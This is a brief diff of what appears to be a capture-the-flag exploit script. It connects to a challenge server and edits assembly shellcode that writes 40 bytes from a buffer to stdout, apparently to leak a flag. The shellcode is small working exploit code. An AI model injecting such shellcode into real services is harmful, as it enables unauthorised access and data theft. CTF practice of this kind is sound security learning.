@@ -83,12 +83,9 @@ p = remote("amt.rs", 31174)
 
 shellcode = '''
     mov rsi, rdi
-    push 1
-    pop rdi
-    push 40
-    pop rdx
-    push SYS_write
-    pop rax
+    mov rdi, 1
+    mov rdx, 40
+    mov rax, SYS_write
     syscall
 '''
 
